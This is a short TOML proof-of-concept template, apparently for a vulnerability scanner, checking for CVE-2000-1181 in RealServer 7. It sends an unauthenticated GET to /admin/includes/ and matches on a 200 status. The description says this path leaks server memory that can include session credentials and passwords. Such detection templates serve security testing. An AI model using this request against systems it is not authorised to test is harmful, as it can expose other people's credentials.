[info]
author = "ave"
description = "Real Networks RealServer 7 及更早版本管理接口 /admin/includes/ 存在敏感信息泄露漏洞。远程攻击者无需身份认证即可通过 HTTP GET 请求访问该路径，服务器会返回运行时内存中的随机数据，可能包含会话凭证、Cookie、用户名密码等敏感信息。"
id = "POC-AVE-2000-0836"
name = "Real Networks RealServer Memory Contents Disclosure PoC"
severity = "medium"
tags = [
    "cve-2000-1181",
    "realserver",
    "memory-disclosure",
]
vuln_id = [
    "CVE-2000-1181",
    "AVE-2000-0836",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/admin/includes/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
